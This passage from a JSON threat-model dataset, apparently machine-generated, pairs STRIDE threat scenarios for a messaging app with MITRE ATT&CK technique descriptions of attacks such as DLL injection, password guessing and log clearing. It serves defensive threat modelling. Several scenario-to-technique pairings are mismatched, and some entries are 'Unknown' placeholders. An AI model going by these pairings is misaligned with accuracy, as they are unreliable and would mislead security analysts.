                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges on a companion device to access encrypted databases.",
            "Assumptions": [
                {
                    "Assumption": "Companion device has exploitable vulnerabilities",
                    "Role": "Application Developer",
                    "Condition": "Presence of security flaws"
                },
                {
                    "Assumption": "The attacker gains initial access to the companion device",
                    "Role": "Attacker",
                    "Condition": "Successful breach"
                },
                {
                    "Assumption": "The device encryption can be bypassed with escalated privileges",
                    "Role": "Application Developer",
                    "Condition": "Weak or flawed encryption"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data on companion devices",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Companion Device",
                "Database Access",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware on the device exploits vulnerabilities to escalate privileges and install a persistent backdoor.",
            "Assumptions": [
                {
                    "Assumption": "Device has vulnerability allowing privilege escalation",
                    "Role": "Application Developer",
                    "Condition": "Presence of exploitable flaw"
                },
                {
                    "Assumption": "Malware can execute on the device",
                    "Role": "Attacker",
                    "Condition": "Malware delivery and execution"
                },
                {
                    "Assumption": "The device lacks proper malware detection and prevention",
                    "Role": "User",
                    "Condition": "Inadequate security measures"
                }
            ],
            "Potential Impact": "System compromise and persistent unauthorized access",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Malware",
                "Backdoor",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "16",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker pretends to be a legitimate user to gain access to the messaging app.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to some public information about the victim.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker performs social engineering."
                },
                {
                    "Assumption": "The attacker can intercept or guess some form of weak multi-factor authentication.",
                    "Role": "Attacker",
                    "Condition": "Valid if MFA is poorly implemented."
                },
                {
                    "Assumption": "The system does not have adequate measures to detect and prevent impersonation.",
                    "Role": "System",
                    "Condition": "Valid if there are no spoofing detection mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive messages.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "authentication",
                "impersonation"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a doppelganger app to harvest user credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users are not able to distinguish between fake and real app.",
                    "Role": "User",
                    "Condition": "Valid if fake app closely mimics the original."
                },
                {
                    "Assumption": "The fake app can bypass app store security checks.",
                    "Role": "Attacker",
                    "Condition": "Valid if app store scrutiny is insufficient."
                },
                {
                    "Assumption": "The attacker's infrastructure can handle communication without raising suspicion.",
                    "Role": "Attacker",
                    "Condition": "Valid if infrastructure is robust."
                }
            ],
            "Potential Impact": "Credential theft possibly leading to account takeovers.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "credential harvesting",
                "fake app"
            ],
            "mitre_technique": {
                "name": "Identify Business Tempo",
                "description": "Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization\u2019s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))",
                "id": "attack-pattern--2339cf19-8f1e-48f7-8a91-0262ba547b6f",
                "technique_id": "T1591.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Use of compromised private keys to initiate communication as a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has gained access to the user's private key.",
                    "Role": "Attacker",
                    "Condition": "Valid if private key is inadequately protected."
                },
                {
                    "Assumption": "There are no effective means to detect usage of compromised keys.",
                    "Role": "System",
                    "Condition": "Valid if key compromise is undetected."
                },
                {
                    "Assumption": "The system relies solely on key pairs for authentication.",
                    "Role": "System",
                    "Condition": "Valid if alternative authentication methods are not implemented."
                }
            ],
            "Potential Impact": "Impersonation leading to unauthorized access and communication.",
            "MITRE ATT&CK Keywords": [
                "key compromise",
                "identity theft",
                "encrypted communication"
            ],
            "mitre_technique": {
                "name": "Install Digital Certificate",
                "description": "Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.(Citation: DigiCert Install SSL Cert)\n\nAdversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. \n\nAdversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).",
                "id": "attack-pattern--c071d8c1-3b3a-4f22-9407-ca4e96921069",
                "technique_id": "T1608.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the SQLite database to alter or delete messages.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the device.",
                    "Role": "Attacker",
                    "Condition": "Valid if device security is weak."
                },
                {
                    "Assumption": "Database encryption or protection is weak or insufficient.",
                    "Role": "System",
                    "Condition": "Valid if database vulnerabilities exist."
                },
                {
                    "Assumption": "The attacker is able to gain root or elevated privileges.",
                    "Role": "Attacker",
                    "Condition": "Valid if privilege escalation is possible."
                }
            ],
            "Potential Impact": "Corruption or loss of critical message data.",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "local access",
                "message alteration"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--58349c74-02f3-4a9e-9dac-6226a6538ebc",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code via a companion device to manipulate communications.",
            "Assumptions": [
                {
                    "Assumption": "Companion device has weak security settings.",
                    "Role": "User/System",
                    "Condition": "Valid if device is inadequately secured."
                },
                {
                    "Assumption": "The app does not validate the integrity of messages properly.",
                    "Role": "System",
                    "Condition": "Valid if message integrity checks are insufficient."
                },
                {
                    "Assumption": "The attacker can compromise one linked device.",
                    "Role": "Attacker",
                    "Condition": "Valid if inter-device security is breached."
                }
            ],
            "Potential Impact": "Unauthorized modification of communication interactions.",
            "MITRE ATT&CK Keywords": [
                "code injection",
                "companion device",
                "communication tampering"
            ],
            "mitre_technique": {
                "name": "Dynamic-link Library Injection",
                "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
                "technique_id": "T1055.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Using man-in-the-middle (MitM) attacks to alter message content in transit.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept the encrypted communication.",
                    "Role": "Attacker",
                    "Condition": "Valid if network communication is unsecured."
                },
                {
                    "Assumption": "The application does not verify the integrity of the messages.",
                    "Role": "System",
                    "Condition": "Valid if message integrity checks are missing."
                },
                {
                    "Assumption": "The attacker can break or weaken the encryption protocol.",
                    "Role": "Attacker",
                    "Condition": "Valid if encryption is exploitably weak."
                }
            ],
            "Potential Impact": "Loss of message integrity and possible misinformation.",
            "MITRE ATT&CK Keywords": [
                "MitM",
                "message interception",
                "transport layer attack"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a message due to lack of audit trails.",
            "Assumptions": [
                {
                    "Assumption": "The messaging application does not log sufficient audit trails.",
                    "Role": "System",
                    "Condition": "Valid if logging mechanisms are insufficient."
                },
                {
                    "Assumption": "The messages can't be cryptographically verified post-send.",
                    "Role": "System",
                    "Condition": "Valid if message authentication codes (MACs) aren't used."
                },
                {
                    "Assumption": "Users can access and modify historical message data.",
                    "Role": "User",
                    "Condition": "Valid if data history is mutable."
                }
            ],
            "Potential Impact": "Difficulty in establishing accountability.",
            "MITRE ATT&CK Keywords": [
                "audit trail",
                "logging",
                "message repudiation"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An adversarial actor denies participation in an intercepted communication due to lack of cryptographic proof.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks built-in non-repudiation verification mechanisms.",
                    "Role": "System",
                    "Condition": "Valid if non-repudiation features are missing."
                },
                {
                    "Assumption": "Digital signatures or cryptographic proofs aren't mandated.",
                    "Role": "System",
                    "Condition": "Valid if cryptographic protections are absent."
                },
                {
                    "Assumption": "There's no policy or technical means to verify sender identity post-transaction.",
                    "Role": "System",
                    "Condition": "Valid if verification tools aren't available."
                }
            ],
            "Potential Impact": "Hindrance in forensic analysis and legal actions.",
            "MITRE ATT&CK Keywords": [
                "non-repudiation",
                "denial of message",
                "legal accountability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider edits logs to erase evidences of certain communications.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored in a modifiable format.",
                    "Role": "System",
                    "Condition": "Valid if logs aren't read-only."
                },
                {
                    "Assumption": "The attacker has necessary privileges to access and modify logs.",
                    "Role": "Insider",
                    "Condition": "Valid if privileged access is unchecked."
                },
                {
                    "Assumption": "Logging systems don't have integrity checks.",
                    "Role": "System",
                    "Condition": "Valid if log integrity mechanisms are missing."
                }
            ],
            "Potential Impact": "Compromised forensic evidence and investigation difficulties.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "evidence destruction",
                "privilege abuse"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exposed SQLite database files leading to unauthorized access to messages.",
            "Assumptions": [
                {
                    "Assumption": "The SQLite database files are not encrypted.",
                    "Role": "System",
                    "Condition": "Valid if data-at-rest encryption is absent."
                },
                {
                    "Assumption": "The attacker has physical or remote access to the device.",
                    "Role": "Attacker",
                    "Condition": "Valid if device security is breached."
                },
                {
                    "Assumption": "File permissions and access controls are not adequately enforced.",
                    "Role": "System",
                    "Condition": "Valid if access controls are weak."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user messages.",
            "MITRE ATT&CK Keywords": [
                "data exposure",
                "unencrypted storage",
                "file access"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Use of compromised network infrastructure to intercept unencrypted backups.",
            "Assumptions": [
                {
                    "Assumption": "Unencrypted backups are transmitted over the network.",
                    "Role": "System",
                    "Condition": "Valid if backup encryption is disabled."
                },
                {
                    "Assumption": "The attacker has control over network infrastructure to intercept traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid if MITM attack is feasible."
                },
                {
                    "Assumption": "Backup files contain sensitive message data.",
                    "Role": "System",
                    "Condition": "Valid if sensitive data is not segregated."
                }
            ],
            "Potential Impact": "Disclosure of sensitive backup data.",
            "MITRE ATT&CK Keywords": [
                "backup interception",
                "unencrypted transmission",
                "network control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exploit of vulnerabilities in custom encryption protocols to extract message contents.",
            "Assumptions": [
                {
                    "Assumption": "There are known vulnerabilities in the custom encryption protocols.",
                    "Role": "System",
                    "Condition": "Valid if protocols are outdated or flawed."
                },
                {
                    "Assumption": "The attacker has enough computing resources to exploit these weaknesses.",
                    "Role": "Attacker",
                    "Condition": "Valid if attack resources are ample."
                },
                {
                    "Assumption": "The encryption implementation lacks regular security updates.",
                    "Role": "System",
                    "Condition": "Valid if patch management is poor."
                }
            ],
            "Potential Impact": "Breached confidentiality of sensitive messages.",
            "MITRE ATT&CK Keywords": [
                "encryption vulnerability",
                "protocol weakness",
                "message extraction"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding servers with illegitimate traffic to disrupt communication services.",
            "Assumptions": [
                {
                    "Assumption": "The servers have limited capacity to handle high traffic.",
                    "Role": "System",
                    "Condition": "Valid if capacity is finite."
                },
                {
                    "Assumption": "The attacker can generate substantial traffic using botnets.",
                    "Role": "Attacker",
                    "Condition": "Valid if botnet resources are accessible."
                },
                {
                    "Assumption": "Network defenses such as traffic filtering are insufficient.",
                    "Role": "System",
                    "Condition": "Valid if anti-DDoS measures are weak."
                }
            ],
            "Potential Impact": "Service disruption leading to inaccessibility.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "flood attack",
                "traffic generation"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Resource exhaustion by exploiting application vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "The application has known resource-related vulnerabilities.",
                    "Role": "System",
                    "Condition": "Valid if app vulnerabilities exist."
                },
                {
                    "Assumption": "The attacker has clear knowledge of this resource weakness.",
                    "Role": "Attacker",
                    "Condition": "Valid if exploit knowledge is available."
                },
                {
                    "Assumption": "The system lacks resource throttling mechanisms.",
                    "Role": "System",
                    "Condition": "Valid if throttling is missing."
                }
            ],
            "Potential Impact": "System downtime and unavailability to users.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "vulnerability exploitation",
                "app crash"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Compromising companion devices to disrupt synchronization and access.",
            "Assumptions": [
                {
                    "Assumption": "Companion devices have low security controls.",
                    "Role": "System",
                    "Condition": "Valid if device security is inadequate."
                },
                {
                    "Assumption": "The attacker can control or disable these devices remotely.",
                    "Role": "Attacker",
                    "Condition": "Valid if remote control is possible."
                },
                {
                    "Assumption": "Communication between primary and companion devices is not resilient.",
                    "Role": "System",
                    "Condition": "Valid if communication protocols are weak."
                }
            ],
            "Potential Impact": "Disruption in multi-device synchronization and access.",
            "MITRE ATT&CK Keywords": [
                "device compromise",
                "sync disruption",
                "remote disable"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting vulnerabilities in the mobile app to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "The mobile app has exploitable vulnerabilities.",
                    "Role": "System",
                    "Condition": "Valid if vulnerabilities are present."
                },
                {
                    "Assumption": "The attacker has the tools and knowledge to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if exploit resources are sufficient."
                },
                {
                    "Assumption": "The app does not employ adequate privilege protection mechanisms.",
                    "Role": "System",
                    "Condition": "Valid if privilege protection is weak."
                }
            ],
            "Potential Impact": "Full control over the user's device and data.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "root access",
                "mobile exploitation"
            ],
            "mitre_technique": {
                "name": "AS-REP Roasting",
